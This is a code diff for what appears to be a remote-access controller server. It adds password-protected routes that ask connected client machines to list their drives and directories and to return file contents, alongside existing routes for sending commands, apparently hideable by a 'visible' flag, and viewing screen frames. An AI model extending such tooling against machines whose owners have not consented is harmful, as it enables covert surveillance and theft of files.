@@ -1,8 +1,10 @@
 import os
 import re
+import uuid
 import shutil
 import sqlite3
 import base64
+import threading
 from contextlib import contextmanager
 from functools import wraps
 
@@ -202,6 +204,33 @@ def handle_upload_frame(data):
         print(f"[Upload Frame Error] {e}")
 
 
+# ── FTP / File Browser WebSocket Handlers ──
+
+pending_fs_requests = {}
+
+
+@socketio.on("fs_list_res")
+def handle_fs_list_res(data):
+    if not isinstance(data, dict):
+        return
+    req_id = data.get("req_id")
+    entry = pending_fs_requests.get(req_id)
+    if entry:
+        entry["result"] = data.get("payload")
+        entry["event"].set()
+
+
+@socketio.on("fs_read_res")
+def handle_fs_read_res(data):
+    if not isinstance(data, dict):
+        return
+    req_id = data.get("req_id")
+    entry = pending_fs_requests.get(req_id)
+    if entry:
+        entry["result"] = data.get("payload")
+        entry["event"].set()
+
+
 # ── REST API Routes ──
 
 
@@ -359,6 +388,63 @@ def set_command():
     socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)
 
     return jsonify({"status": "success", "message": "Command sent over WebSocket"})
+
+
+# ── File System / FTP Browser Routes ──
+
+
+@app.post("/api/fs/list")
+@require_password
+def fs_list():
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    path = data.get("path", "drives")
+
+    if not username or not is_safe_name(username):
+        return jsonify({"error": "Missing or invalid username"}), 400
+
+    if username not in active_clients.values():
+        return jsonify({"error": "Client is currently offline"}), 404
+
+    req_id = str(uuid.uuid4())
+    event = threading.Event()
+    pending_fs_requests[req_id] = {"event": event, "result": None}
+
+    socketio.emit("fs_list_req", {"req_id": req_id, "path": path}, room=username)
+
+    if event.wait(timeout=8):
+        res = pending_fs_requests.pop(req_id, {}).get("result")
+        return jsonify(res or {"error": "No response payload"})
+    else:
+        pending_fs_requests.pop(req_id, None)
+        return jsonify({"error": "File browsing request timed out"}), 504
+
+
+@app.post("/api/fs/read")
+@require_password
+def fs_read():
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    path = data.get("path")
+
+    if not username or not is_safe_name(username) or not path:
+        return jsonify({"error": "Missing required parameters"}), 400
+
+    if username not in active_clients.values():
+        return jsonify({"error": "Client is currently offline"}), 404
+
+    req_id = str(uuid.uuid4())
+    event = threading.Event()
+    pending_fs_requests[req_id] = {"event": event, "result": None}
+
+    socketio.emit("fs_read_req", {"req_id": req_id, "path": path}, room=username)
+
+    if event.wait(timeout=10):
+        res = pending_fs_requests.pop(req_id, {}).get("result")
+        return jsonify(res or {"error": "No response payload"})
+    else:
+        pending_fs_requests.pop(req_id, None)
+        return jsonify({"error": "File read request timed out"}), 504
 
 
 @app.get("/frames/<username>/<filename>")
